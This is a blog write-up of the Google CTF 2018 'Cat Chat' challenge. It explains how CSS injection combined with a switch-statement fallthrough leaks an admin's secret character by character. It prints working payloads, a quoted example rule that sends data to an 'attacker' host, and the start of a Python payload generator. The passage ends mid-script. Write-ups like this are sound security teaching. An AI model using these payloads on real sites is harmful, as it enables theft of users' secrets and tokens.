<!DOCTYPE html>
<html lang="en-us">
<head>

  <meta charset="utf-8" />

  
  <title>Cat Chat</title>

  
  





<meta name="author" content="betaveros" />
<meta name="description" content=" You discover this cat enthusiast chat app, but the annoying thing about it is that you’re always banned when you start talking about dogs. Maybe if you would somehow get to know the admin’s password, you could fix that.
 This challenge is a simple chat app written in NodeJS. The home page redirects you to a chat room labeled with a random UUID. Anybody can join the same chat room with the URL.
In a chat room, you can chat and issue two commands, /name to set your name and /report to report that somebody is talking about dogs. After anybody in the chat room issues /report, the admin shows up, listens for a while, and bans anybody who mentions the word “dog”.
There are two more commands, /secret and /ban, which are in the server source code and also described in comments in the HTML source if you didn’t notice:

" />




<meta name="generator" content="Hugo 0.31-DEV" />


<link rel="canonical" href="//blog.vero.site/post/cat-chat" />
<link rel="alternative" href="/index.xml" title="Bounded-Error Log" type="application/atom+xml" />


<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<meta name="format-detection" content="telephone=no,email=no,adress=no" />
<meta http-equiv="Cache-Control" content="no-transform" />


<meta name="robots" content="index,follow" />
<meta name="referrer" content="origin-when-cross-origin" />




<link rel="icon" href="/favicon.ico" />


<link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700|Fira+Sans:400,400i,700" rel="stylesheet">
<link rel="stylesheet" href="/css/bundle.css" />
<link rel="stylesheet" href="/katex/katex.min.css" />


  
  <!--[if lt IE 9]>
    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
  <![endif]-->

<!--[if lte IE 11]>
    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
  <![endif]-->


<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>


<script src="//cdn.bootcss.com/smooth-scroll/12.1.4/js/smooth-scroll.polyfills.min.js"></script>


</head>
  <body><div id="wrapper">
    
<header class="site-header">
	
	<h2 class="title"><a href="/">Bounded-Error Log</a></h2>
	
	<p class="subtitle">theoretical and applied randomness by <a href="https://beta.vero.site/">betaveros</a></p>
	<button class="menu-toggle" type="button" aria-label="Toggle Menu">
		<span class="icon icon-menu" aria-hidden="true"></span>
	</button>
	<nav class="site-menu collapsed">
		<h2 class="offscreen">Main Menu</h2>
		<ul class="menu-list">
			
			
			
			
			<li class="menu-item "><a href="/about">About</a></li>
			
			<li class="menu-item "><a href="/category/life">Life</a></li>
			
			<li class="menu-item "><a href="/category/thoughts">Thoughts</a></li>
			
			<li class="menu-item "><a href="/category/self-analysis">Self-Analysis</a></li>
			
			<li class="menu-item "><a href="/category/math">Math</a></li>
			
			<li class="menu-item "><a href="/category/cs">CS</a></li>
			
			<li class="menu-item "><a href="/category/puzzles">Puzzles</a></li>
			
			<li class="menu-item "><a href="/category/meta">Meta</a></li>
			
			<li class="menu-item "><a href="/util">Utilities</a></li>
			
		</ul>
	</nav>
	<nav class="social-menu collapsed">
		<h2 class="offscreen">Social Networks</h2>
		<ul class="social-list">

			

			
			<li class="social-item">
				<a href="//github.com/betaveros" title="GitHub" aria-label="GitHub"><span class="icon icon-github" aria-hidden="true"></span></a>
			</li>

			

			<li class="social-item">
				<a href="/index.xml" title="RSS" aria-label="RSS"><span class="icon icon-rss" aria-hidden="true"></span></a>
			</li>

		</ul>
	</nav>
</header>

<section class="main post-detail">
	<header>
		<h1 class="post-title">Cat Chat</h1>
		
		<h2 class="post-subtitle">Google CTF 2018</h2>
		
		<p class="post-meta">
		
		2018-06-28
		(2706 words)
		
		<span class="post-categories">
			filed under
			<a href="/category/cs">CS</a>
		</span>
		
		</p>
	</header>
	<article><blockquote>
<p>You discover this cat enthusiast chat app, but the annoying thing about it is that you’re always banned when you start talking about dogs. Maybe if you would somehow get to know the admin’s password, you could fix that.</p>
</blockquote>
<p>This challenge is a simple chat app written in NodeJS. The home page redirects you to a chat room labeled with a random UUID. Anybody can join the same chat room with the URL.</p>
<p><img src="/img/cat-chat-0.png" alt="Fresh Cat Chat room" /></p>
<p>In a chat room, you can chat and issue two commands, <code>/name</code> to set your name and <code>/report</code> to report that somebody is talking about dogs. After anybody in the chat room issues <code>/report</code>, the admin shows up, listens for a while, and bans anybody who mentions the word “dog”.</p>
<p>There are two more commands, <code>/secret</code> and <code>/ban</code>, which are in the server source code and also described in comments in the HTML source if you didn’t notice:</p>
<p></p>
<pre class="sourceCode html"><code class="sourceCode html"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="kw">&lt;p&gt;</span>Commands you can use: (just type a message starting with slash to invoke commands)<span class="kw">&lt;/p&gt;</span></div>
<div class="sourceLine" id="2" href="#2" data-line-number="2"><span class="kw">&lt;p&gt;</span>- `/name YourNewName` - Change your nick name to YourNewName.<span class="kw">&lt;/p&gt;</span></div>
<div class="sourceLine" id="3" href="#3" data-line-number="3"><span class="kw">&lt;p&gt;</span>- `/report` - Report dog talk to the admin.<span class="kw">&lt;/p&gt;</span></div>
<div class="sourceLine" id="4" href="#4" data-line-number="4"><span class="co">&lt;!--</span></div>
<div class="sourceLine" id="5" href="#5" data-line-number="5"><span class="co">  Admin commands:</span></div>
<div class="sourceLine" id="6" href="#6" data-line-number="6"><span class="co">  - `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It&#39;s enough to set it once a year, so no need to issue a /secret command every time you open a chat room.</span></div>
<div class="sourceLine" id="7" href="#7" data-line-number="7"><span class="co">  - `/ban UserName` - Bans the user with UserName from the chat (requires the correct admin password to be set).</span></div>
<div class="sourceLine" id="8" href="#8" data-line-number="8"><span class="co">--&gt;</span></div></code></pre>
<p>Anybody can run <code>/secret</code>; it sets your secret password, displays it in the attribute of a <code>&lt;span&gt;</code> tag in your browser, and stores it in a cookie. And <code>/ban</code> will ban a user, but only if your cookie matches the admin password. When a user is banned, they get a <code>banned</code> cookie that prevents them from loading the chat room. Of course, they can simply delete the <code>banned</code> cookie and rejoin (which will prove to be very useful).</p>
<p>We are told that we have to get the admin’s password. There are basically two stages to accomplishing this.</p>
<h3 id="injection">Injection</h3>
<p>We need to steal a secret from the admin. Reading the client-side source code reveals a helper function that describes the admin’s behavior. So it appears that when we issue <code>/report</code>, the admin actually opens the page in a browser and runs this function to ban people:</p>
<pre class="sourceCode js"><code class="sourceCode javascript"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="co">// Admin helper function. Invoke this to automate banning people in a misbehaving room.</span></div>
<div class="sourceLine" id="2" href="#2" data-line-number="2"><span class="co">// Note: the admin will already have their secret set in the cookie (it&#39;s a cookie with long expiration),</span></div>
<div class="sourceLine" id="3" href="#3" data-line-number="3"><span class="co">// so no need to deal with /secret and such when joining a room.</span></div>
<div class="sourceLine" id="4" href="#4" data-line-number="4"><span class="kw">function</span> <span class="at">cleanupRoomFullOfBadPeople</span>() <span class="op">{</span></div>
<div class="sourceLine" id="5" href="#5" data-line-number="5">  <span class="at">send</span>(<span class="vs">`I&#39;ve been notified that someone has brought up a forbidden topic. I will ruthlessly ban anyone who mentions d*gs going forward. Please just stop and start talking about cats for d*g&#39;s sake.`</span>)<span class="op">;</span></div>
<div class="sourceLine" id="6" href="#6" data-line-number="6">  last <span class="op">=</span> <span class="va">conversation</span>.<span class="at">lastElementChild</span><span class="op">;</span></div>
<div class="sourceLine" id="7" href="#7" data-line-number="7">  <span class="at">setInterval</span>(<span class="kw">function</span>() <span class="op">{</span></div>
<div class="sourceLine" id="8" href="#8" data-line-number="8">    <span class="kw">var</span> p<span class="op">;</span></div>
<div class="sourceLine" id="9" href="#9" data-line-number="9">    <span class="cf">while</span> (p <span class="op">=</span> <span class="va">last</span>.<span class="at">nextElementSibling</span>) <span class="op">{</span></div>
<div class="sourceLine" id="10" href="#10" data-line-number="10">      last <span class="op">=</span> p<span class="op">;</span></div>
<div class="sourceLine" id="11" href="#11" data-line-number="11">      <span class="cf">if</span> (<span class="va">p</span>.<span class="at">tagName</span> <span class="op">!=</span> <span class="st">&#39;P&#39;</span> <span class="op">||</span> <span class="va">p</span>.<span class="va">children</span>.<span class="at">length</span> <span class="op">&lt;</span> <span class="dv">2</span>) <span class="cf">continue</span><span class="op">;</span></div>
<div class="sourceLine" id="12" href="#12" data-line-number="12">      <span class="kw">var</span> name <span class="op">=</span> <span class="va">p</span>.<span class="at">children</span>[<span class="dv">0</span>].<span class="at">innerText</span><span class="op">;</span></div>
<div class="sourceLine" id="13" href="#13" data-line-number="13">      <span class="kw">var</span> msg <span class="op">=</span> <span class="va">p</span>.<span class="at">children</span>[<span class="dv">1</span>].<span class="at">innerText</span><span class="op">;</span></div>
<div class="sourceLine" id="14" href="#14" data-line-number="14">      <span class="cf">if</span> (<span class="va">msg</span>.<span class="at">match</span>(<span class="ss">/dog/i</span>)) <span class="op">{</span></div>
<div class="sourceLine" id="15" href="#15" data-line-number="15">        <span class="at">send</span>(<span class="vs">`/ban </span><span class="sc">${</span>name<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></div>
<div class="sourceLine" id="16" href="#16" data-line-number="16">        <span class="at">send</span>(<span class="vs">`As I said, d*g talk will not be tolerated.`</span>)<span class="op">;</span></div>
<div class="sourceLine" id="17" href="#17" data-line-number="17">      <span class="op">}</span></div>
<div class="sourceLine" id="18" href="#18" data-line-number="18">    <span class="op">}</span></div>
<div class="sourceLine" id="19" href="#19" data-line-number="19">  <span class="op">},</span> <span class="dv">1000</span>)<span class="op">;</span></div>
<div class="sourceLine" id="20" href="#20" data-line-number="20"><span class="op">}</span></div></code></pre>
<p>Of course it’s an automated process doing this, but there’s a browser involved, so the first vulnerability we look for is some kind of cross-site scripting or injection we can use to get something useful to run on the admin’s page. Unfortunately, everything we have control over is escaped with the function:</p>
<pre class="sourceCode js"><code class="sourceCode javascript"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="kw">let</span> esc <span class="op">=</span> (str) <span class="op">=&gt;</span> <span class="va">str</span>.<span class="at">replace</span>(<span class="ss">/&lt;/g</span><span class="op">,</span> <span class="st">&#39;&amp;lt;&#39;</span>).<span class="at">replace</span>(/&gt;/g<span class="op">,</span> <span class="st">&#39;&amp;gt;&#39;</span>).<span class="at">replace</span>(<span class="ss">/&quot;/g</span><span class="op">,</span> <span class="st">&#39;&amp;quot;&#39;</span>).<span class="at">replace</span>(<span class="ss">/&#39;/g</span><span class="op">,</span> <span class="st">&#39;&amp;apos;&#39;</span>)<span class="op">;</span></div></code></pre>
<p>It’s not the strongest escaping in the world (ampersands aren’t escaped), but it blocks most of the obvious attacks. We can’t inject any HTML tags or break out of any attributes to add event handlers. Even if we could, the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> (CSP) of the page is fairly strong:</p>
<pre class="sourceCode js"><code class="sourceCode javascript"><div class="sourceLine" id="1" href="#1" data-line-number="1">    headers<span class="op">:</span> <span class="op">{</span></div>
<div class="sourceLine" id="2" href="#2" data-line-number="2">      <span class="st">&#39;Content-Security-Policy&#39;</span><span class="op">:</span> [</div>
<div class="sourceLine" id="3" href="#3" data-line-number="3">        <span class="st">&#39;default-src </span><span class="sc">\&#39;</span><span class="st">self</span><span class="sc">\&#39;</span><span class="st">&#39;</span><span class="op">,</span></div>
<div class="sourceLine" id="4" href="#4" data-line-number="4">        <span class="st">&#39;style-src </span><span class="sc">\&#39;</span><span class="st">unsafe-inline</span><span class="sc">\&#39;</span><span class="st"> </span><span class="sc">\&#39;</span><span class="st">self</span><span class="sc">\&#39;</span><span class="st">&#39;</span><span class="op">,</span></div>
<div class="sourceLine" id="5" href="#5" data-line-number="5">        <span class="st">&#39;script-src </span><span class="sc">\&#39;</span><span class="st">self</span><span class="sc">\&#39;</span><span class="st"> https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/&#39;</span><span class="op">,</span></div>
<div class="sourceLine" id="6" href="#6" data-line-number="6">        <span class="st">&#39;frame-src </span><span class="sc">\&#39;</span><span class="st">self</span><span class="sc">\&#39;</span><span class="st"> https://www.google.com/recaptcha/&#39;</span><span class="op">,</span></div>
<div class="sourceLine" id="7" href="#7" data-line-number="7">      ].<span class="at">join</span>(<span class="st">&#39;; &#39;</span>)</div>
<div class="sourceLine" id="8" href="#8" data-line-number="8">    <span class="op">},</span></div></code></pre>
<p>…or is it? Scripts, frames, and everything caught by <code>default</code> but not explicitly mentioned are all locked down, but the <code>style-src</code> policy allows <code>unsafe-inline</code>. Not a phrase to inspire confidence in a system’s security. Indeed, if you read up on <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src"><code>style-src</code></a> you encounter the following note in bright yellow, right before <code>unsafe-inline</code> is documented:</p>
<blockquote>
<p><strong>Note:</strong> Disallowing inline styles and inline scripts is one of the biggest security wins CSP provides. However, if you absolutely have to use it, there are a few mechanisms that will allow them.</p>
</blockquote>
<p>So, inline styles are not blocked by the CSP. A closer look at the client source code reveals one line in which data we control, the name of a chatter who is banned, is injected into a <code>&lt;style&gt;</code> tag:</p>
<pre class="sourceCode js"><code class="sourceCode javascript"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="at">display</span>(<span class="vs">`</span><span class="sc">${</span><span class="at">esc</span>(<span class="va">data</span>.<span class="at">name</span>)<span class="sc">}</span><span class="vs"> was banned.&lt;style&gt;span[data-name^=</span><span class="sc">${</span><span class="at">esc</span>(<span class="va">data</span>.<span class="at">name</span>)<span class="sc">}</span><span class="vs">] { color: red; }&lt;/style&gt;`</span>)<span class="op">;</span></div></code></pre>
<p>This code is supposed to make the name of any banned chatter turn red, but it’s not quoted, so it will work poorly if <code>esc(data.name)</code> contains any special CSS characters. And even though all the characters we need to inject HTML tags or mess with attributes are escaped, we have plenty of CSS special characters at our disposal that we can get through to <code>esc(data.name)</code>. So we have a CSS injection.</p>
<p>What can we do with it? Googling turns up a few old StackOverflow answers about ways to call JavaScript in CSS, but they all seem to require obsolete versions of browsers. More interesting is a technique documented in the CureSec blog post <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html">“Reading Data via CSS Injection”</a> or OWASP’s page <a href="https://www.owasp.org/index.php/Testing_for_CSS_Injection_%28OTG-CLIENT-005%29">Testing for CSS Injection</a>. The essential idea, taken from the first page, looks like this:</p>
<pre class="sourceCode html"><code class="sourceCode html"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="kw">&lt;style&gt;</span></div>
<div class="sourceLine" id="2" href="#2" data-line-number="2">input<span class="ex">[name=csrf_token][value=^a]</span> {</div>
<div class="sourceLine" id="3" href="#3" data-line-number="3">  <span class="kw">background-image</span>: <span class="fu">url</span>(http://attacker/log?a);</div>
<div class="sourceLine" id="4" href="#4" data-line-number="4">}</div>
<div class="sourceLine" id="5" href="#5" data-line-number="5"><span class="kw">&lt;/style&gt;</span></div></code></pre>
<p>The key ingredient of this CSS rule is the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors">attribute selector</a>. This rule will match an <code>input</code> element whose <code>name</code> is <code>csrf_token</code> and whose <code>value</code> attribute starts with <code>a</code>. If it matches an element on the page, then the browser will send a request to <code>http://attacker/log?a</code> to try to get a background image and style the element with it. In other words, assuming that the user’s CSRF token is stored in an <code>&lt;input&gt;</code> element with <code>name</code> equal to <code>&quot;csrf_token&quot;</code>, if we can inject this style and we control <code>http://attacker/log</code>, we will get a request at <code>http://attacker/log?a</code> if and only if the user’s CSRF token starts with an <code>a</code>. We can repeat this for other characters to figure out what the first character is, and then repeat with longer prefixes to figure out the following characters one at a time.</p>
<p>For this challenge, there is conveniently some code that will put the user’s secret in the <code>data-secret</code> attribute of a <code>span</code> tag, in the handling of any data with type <code>secret</code>:</p>
<pre class="sourceCode js"><code class="sourceCode javascript"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="at">display</span>(<span class="vs">`Successfully changed secret to &lt;span data-secret=&quot;</span><span class="sc">${</span><span class="at">esc</span>(<span class="at">cookie</span>(<span class="st">&#39;flag&#39;</span>))<span class="sc">}</span><span class="vs">&quot;&gt;*****&lt;/span&gt;`</span>)<span class="op">;</span></div></code></pre>
<p>Once this is in the DOM, we can use the above CSS injection to exfiltrate it character by character. There’s another minor obstacle here in that images are also blocked by the catch-all <code>default</code> rules of the Content Security Policy, so we can’t actually exfiltrate the secret this way to an external <code>attacker.com</code>. However, the workaround is easy: we can just supply a relative <code>send</code> URL to the very chat room we are in, with a name and message we can choose ourselves. Sending a request to this URL will post a chat message, which we will be able to see.</p>
<p>Putting it all together, if we want to figure out what the <code>data-secret</code> attribute of the <code>&lt;span&gt;</code> tag displayed by the above JavaScript, we want to inject a CSS rule that looks like this:</p>
<pre class="sourceCode css"><code class="sourceCode css"><div class="sourceLine" id="1" href="#1" data-line-number="1">span<span class="ex">[data-secret^a]</span> {</div>
<div class="sourceLine" id="2" href="#2" data-line-number="2">  <span class="kw">background-image</span>: <span class="fu">url</span>(send?name=a&amp;msg=a);</div>
<div class="sourceLine" id="3" href="#3" data-line-number="3">}</div></code></pre>
<p>This will send a message from <code>a</code> saying <code>a</code> if and only if somebody who has the chat room open has a <code>&lt;span&gt;</code> tag on their page with attribute <code>data-secret</code> starting with <code>a</code>.</p>
<p>To inject this rule in the context of the existing CSS and keep it syntactically correct, we can set our name to <code>]{}span[data-secret^=a]{background-image:url(send?name=a&amp;msg=a);}a[id=a</code> and then get ourselves banned. We can already try this out by running <code>/secret</code> in a chatroom, and then joining the chatroom from a different browser to try to exfiltrate the secret from the first browser.</p>
<figure>
<img src="/img/cat-chat-exfiltrate.png" alt="Getting your secret exfiltrated" /><figcaption>Getting your secret exfiltrated</figcaption>
</figure>
<p>In practice, to speed the exfiltration up, we would want to inject many different selectors at once, each testing for a different character and sending a different message.</p>
<h3 id="triggering-the-secret">Triggering the Secret</h3>
<p>However, there’s a bigger obstacle here, which is that there normally <em>isn’t</em> a convenient <code>&lt;span&gt;</code> tag in the admin’s browser with the admin’s password as an attribute. This is mentioned a few times in the code and most clearly spelled out in the comment right before <code>function cleanupRoomFullOfBadPeople()</code>:</p>
<pre class="sourceCode js"><code class="sourceCode javascript"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="co">// Note: the admin will already have their secret set in the cookie (it&#39;s a cookie with long expiration),</span></div>
<div class="sourceLine" id="2" href="#2" data-line-number="2"><span class="co">// so no need to deal with /secret and such when joining a room.</span></div></code></pre>
<p>We note in passing that the CSS injection above will also work to get the admin’s browser to send any message to the server, since we can make the <code>background-image</code> URL anything we want and just replace the selector with something like <code>body</code>, which will always match. We could make the admin request something like</p>
<pre><code>background-image:url(send?name=a&amp;msg=/secret%20foo);</code></pre>
<p>This will cause the server to respond with a header that will set the admin’s secret. The problem is that the response to such a request is not passed to <code>handle</code> on the client side, so it won’t cause the <code>&lt;span&gt;</code> tag we need to appear on the admin’s browser — not to mention, it would first overwrite the the flag we’re trying to get. So now what?</p>
<p>The solution turns out to be more straightforward than one might expect, although noticing it requires sharp reading of the code, specifically, the server’s switch statement for handling messages:</p>
<pre class="sourceCode js"><code class="sourceCode javascript"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="cf">switch</span> (<span class="va">msg</span>.<span class="at">match</span>(<span class="ss">/</span><span class="sc">^\/[^ ]*</span><span class="ss">/</span>)[<span class="dv">0</span>]) <span class="op">{</span></div>
<div class="sourceLine" id="2" href="#2" data-line-number="2">  <span class="cf">case</span> <span class="st">&#39;/name&#39;</span><span class="op">:</span></div>
<div class="sourceLine" id="3" href="#3" data-line-number="3">    <span class="cf">if</span> (<span class="op">!</span>(arg <span class="op">=</span> <span class="va">msg</span>.<span class="at">match</span>(<span class="ss">/</span><span class="sc">\/</span><span class="ss">name </span><span class="sc">(</span><span class="ss">.</span><span class="sc">+)</span><span class="ss">/</span>))) <span class="cf">break</span><span class="op">;</span></div>
<div class="sourceLine" id="4" href="#4" data-line-number="4">    response <span class="op">=</span> <span class="op">{</span><span class="dt">type</span><span class="op">:</span> <span class="st">&#39;rename&#39;</span><span class="op">,</span> <span class="dt">name</span><span class="op">:</span> arg[<span class="dv">1</span>]<span class="op">};</span></div>
<div class="sourceLine" id="5" href="#5" data-line-number="5">    <span class="at">broadcast</span>(room<span class="op">,</span> <span class="op">{</span><span class="dt">type</span><span class="op">:</span> <span class="st">&#39;name&#39;</span><span class="op">,</span> <span class="dt">name</span><span class="op">:</span> arg[<span class="dv">1</span>]<span class="op">,</span> <span class="dt">old</span><span class="op">:</span> name<span class="op">}</span>)<span class="op">;</span></div>
<div class="sourceLine" id="6" href="#6" data-line-number="6">  <span class="cf">case</span> <span class="st">&#39;/ban&#39;</span><span class="op">:</span></div>
<div class="sourceLine" id="7" href="#7" data-line-number="7">    <span class="cf">if</span> (<span class="op">!</span>(arg <span class="op">=</span> <span class="va">msg</span>.<span class="at">match</span>(<span class="ss">/</span><span class="sc">\/</span><span class="ss">ban </span><span class="sc">(</span><span class="ss">.</span><span class="sc">+)</span><span class="ss">/</span>))) <span class="cf">break</span><span class="op">;</span></div>
<div class="sourceLine" id="8" href="#8" data-line-number="8">    <span class="cf">if</span> (<span class="op">!</span><span class="va">req</span>.<span class="at">admin</span>) <span class="cf">break</span><span class="op">;</span></div>
<div class="sourceLine" id="9" href="#9" data-line-number="9">    <span class="at">broadcast</span>(room<span class="op">,</span> <span class="op">{</span><span class="dt">type</span><span class="op">:</span> <span class="st">&#39;ban&#39;</span><span class="op">,</span> <span class="dt">name</span><span class="op">:</span> arg[<span class="dv">1</span>]<span class="op">}</span>)<span class="op">;</span></div>
<div class="sourceLine" id="10" href="#10" data-line-number="10">  <span class="cf">case</span> <span class="st">&#39;/secret&#39;</span><span class="op">:</span></div>
<div class="sourceLine" id="11" href="#11" data-line-number="11">    <span class="cf">if</span> (<span class="op">!</span>(arg <span class="op">=</span> <span class="va">msg</span>.<span class="at">match</span>(<span class="ss">/</span><span class="sc">\/</span><span class="ss">secret </span><span class="sc">(</span><span class="ss">.</span><span class="sc">+)</span><span class="ss">/</span>))) <span class="cf">break</span><span class="op">;</span></div>
<div class="sourceLine" id="12" href="#12" data-line-number="12">    <span class="va">res</span>.<span class="at">setHeader</span>(<span class="st">&#39;Set-Cookie&#39;</span><span class="op">,</span> <span class="st">&#39;flag=&#39;</span> <span class="op">+</span> arg[<span class="dv">1</span>] <span class="op">+</span> <span class="st">&#39;; Path=/; Max-Age=31536000&#39;</span>)<span class="op">;</span></div>
<div class="sourceLine" id="13" href="#13" data-line-number="13">    response <span class="op">=</span> <span class="op">{</span><span class="dt">type</span><span class="op">:</span> <span class="st">&#39;secret&#39;</span><span class="op">};</span></div>
<div class="sourceLine" id="14" href="#14" data-line-number="14">  <span class="cf">case</span> <span class="st">&#39;/report&#39;</span><span class="op">:</span></div>
<div class="sourceLine" id="15" href="#15" data-line-number="15">    <span class="cf">if</span> (<span class="op">!</span>(arg <span class="op">=</span> <span class="va">msg</span>.<span class="at">match</span>(<span class="ss">/</span><span class="sc">\/</span><span class="ss">report </span><span class="sc">(</span><span class="ss">.</span><span class="sc">+)</span><span class="ss">/</span>))) <span class="cf">break</span><span class="op">;</span></div>
<div class="sourceLine" id="16" href="#16" data-line-number="16">    <span class="kw">var</span> ip <span class="op">=</span> <span class="va">req</span>.<span class="at">headers</span>[<span class="st">&#39;x-forwarded-for&#39;</span>]<span class="op">;</span></div>
<div class="sourceLine" id="17" href="#17" data-line-number="17">    ip <span class="op">=</span> ip <span class="op">?</span> <span class="va">ip</span>.<span class="at">split</span>(<span class="st">&#39;,&#39;</span>)[<span class="dv">0</span>] : <span class="va">req</span>.<span class="va">connection</span>.<span class="at">remoteAddress</span><span class="op">;</span></div>
<div class="sourceLine" id="18" href="#18" data-line-number="18">    response <span class="op">=</span> await <span class="va">admin</span>.<span class="at">report</span>(arg[<span class="dv">1</span>]<span class="op">,</span> ip<span class="op">,</span> <span class="vs">`https://</span><span class="sc">${</span><span class="va">req</span>.<span class="va">headers</span>.<span class="at">host</span><span class="sc">}</span><span class="vs">/room/</span><span class="sc">${</span>room<span class="sc">}</span><span class="vs">/`</span>)<span class="op">;</span></div>
<div class="sourceLine" id="19" href="#19" data-line-number="19"><span class="op">}</span></div></code></pre>
<p>The first interesting feature is how the initial regex starts with the <code>^</code> anchor, but the individual branches use regexes that aren’t anchored. While interesting, this doesn’t make the code vulnerable by itself. However, there is a second, more serious bug, which is that the <code>case</code>s of this <code>switch</code> statement <em>don’t end with <code>break</code>s</em>, so each case will fall through to the next.</p>
<p>So if the server receives a command that starts with, say, <code>/name</code>, but also contains <code>/ban</code> somewhere in it, then the server will process the rename request and then fall through into the <code>/ban</code> case. For us, the relevant fallthrough is that <code>/ban</code> falls through to <code>/secret</code>. So, if we get the admin to run <code>/ban</code> on a name that contains the pattern <code>/\/secret (.+)/</code>, then the admin will get a response of type <code>secret</code>. This response will first set the admin’s secret cookie with a header, and then it will get passed to the <code>handle</code> on the admin’s browser, causing the browser to display a <code>&lt;span&gt;</code> tag with the <code>data-secret</code> attribute equal to the admin’s secret.</p>
<p>That <code>&lt;span&gt;</code> tag is exactly what we want. However, there is a final obstacle that we have already mentioned, which is that we actively don’t want the header that will set the admin’s secret cookie. If not worked around, it will just overwrite the flag that we’re trying to steal before it’s displayed in the <code>&lt;span&gt;</code> tag. The solution is to inject some other arguments into the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie">Set-Cookie header</a> so that the browser will get the type-<code>secret</code> data response but won’t actually act on this header to set the cookie. Reading the linked docs for the Set-Cookie header and experimenting a little will reveal that the <code>Domain</code> directive works:</p>
<blockquote>
<p><strong>Invalid domains</strong></p>
<p>A cookie belonging to a domain that does not include the origin server <a href="https://tools.ietf.org/html/rfc6265#section-4.1.2.3">should be rejected by the user agent</a>. The following cookie will be rejected if it was set by a server hosted on originalcompany.com.</p>
<pre class="wrap"><code>Set-Cookie: qwerty=219ffwef9w0f; Domain=somecompany.co.uk; Path=/; Expires=Wed, 30 Aug 2019 00:00:00 GMT</code></pre>
</blockquote>
<p>So now we have everything we need.</p>
<h3 id="the-exploit">The Exploit</h3>
<p>It turns out that you can do both stages in a single ban. If you set your name to the following string</p>
<pre class="wrap"><code>/secret foo; Domain=bar]{}span[data-secret^=C]{background-image:url(send?name=C&amp;msg=C);}a[id=a</code></pre>
<p>and then get yourself banned (by issuing <code>/report</code> and then saying <code>dog</code> while the admin is around), here’s what will happen.</p>
<ol type="1">
<li><p>The admin’s helper function will send the following message to the server (among messages admonishing people for talking about dogs):</p>
<pre class="wrap"><code>/ban /secret foo; Domain=bar]{}span[data-secret^=C]{background-image:url(send?name=C&amp;msg=C);}a[id=a</code></pre>
<p>This will make the server try to ban you.</p></li>
<li><p>Because of the <code>switch</code> fallthrough, however, the server will end up responding to the admin’s ban message with the <code>Set-Cookie</code> header</p>
<pre class="wrap"><code>flag=foo; Domain=bar]{}span[data-secret^=C]{background-image:url(send?name=C&amp;msg=C);}a[id=a; Path=/; Max-Age=31536000</code></pre>
<p>and the body being the JSON <code>{type: 'secret'}</code>.</p></li>
<li><p>The admin’s browser will receive the response and notice its <code>Set-Cookie</code> header. However, because the <code>Domain</code> directive of the <code>Set-Cookie</code> header is garbage, the admin’s browser will just ignore the entire header and pass the JSON response on.</p></li>
<li><p>The browser will <code>handle</code> the JSON response by running the coveted line of JavaScript that will put the correct, non-overwritten flag into the admin’s DOM:</p>
<pre class="wrap"><code>display(`Successfully changed secret to &lt;span data-secret=&quot;${esc(cookie(&#39;flag&#39;))}&quot;&gt;*****&lt;/span&gt;`);</code></pre></li>
<li><p>In the middle of handling the admin’s request, the server will also broadcast a <code>ban</code> message to everybody in the room, including the admin. The roomwide <code>ban</code> message will arrive at the <code>EventSource</code> in the admin’s browser and will also get passed to <code>handle</code> (it doesn’t matter whether this happens before or after the above handling). This injects the following <code>&lt;style&gt;</code> tag:</p>
<pre class="sourceCode html"><code class="sourceCode html"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="kw">&lt;style&gt;</span>span<span class="ex">[data-name^=/secret foo; Domain=bar]</span>{}span<span class="ex">[data-secret^=C]</span>{<span class="kw">background-image</span>:<span class="fu">url</span>(send?name=C&amp;msg=C);}a<span class="ex">[id=a]</span> { <span class="kw">color</span>: <span class="dv">red</span>; }<span class="kw">&lt;/style&gt;</span></div></code></pre></li>
<li><p>Now that both 4 and 5 have happened, if the flag starts with <code>C</code>, then the admin’s browser will see that the CSS selector from 5 matches the <code>&lt;span&gt;</code> from 4, and will attempt to load the background image <code>send?name=C&amp;msg=C</code>. This sends another request to the chat room, which broadcasts <code>C</code> to the chat room.</p></li>
<li><p>Finally, you can read that message (or observe its absence) from the comfort of your own browser. Now you have the first letter of the flag, and can repeat with later characters.</p></li>
</ol>
<p>To turn this into a practical exploit, you just include a couple dozen selectors at once instead of just one, each with a different <code>background-image</code> URL that sends a different message to the chat room. Here’s a short script that will generate a <code>/name</code> command that you can run with a known prefix (after <code>CTF{</code>) as a command. You can then paste the message into the box, then type <code>/report</code> and then <code>dog</code> to get the next character.</p>
<pre class="sourceCode python"><code class="sourceCode python"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="im">import</span> sys</div>
<div class="sourceLine" id="2" href="#2" data-line-number="2"><span class="im">import</span> string</div>
<div class="sourceLine" id="3" href="#3" data-line-number="3">known_prefix <span class="op">=</span> sys.argv[<span class="dv">1</span>]</div>
<div class="sourceLine" id="4" href="#4" data-line-number="4">ret <span class="op">=</span> [<span class="st">&quot;/name /secret foo; Domain=bar]</span><span class="sc">{}</span><span class="st">&quot;</span>]</div>
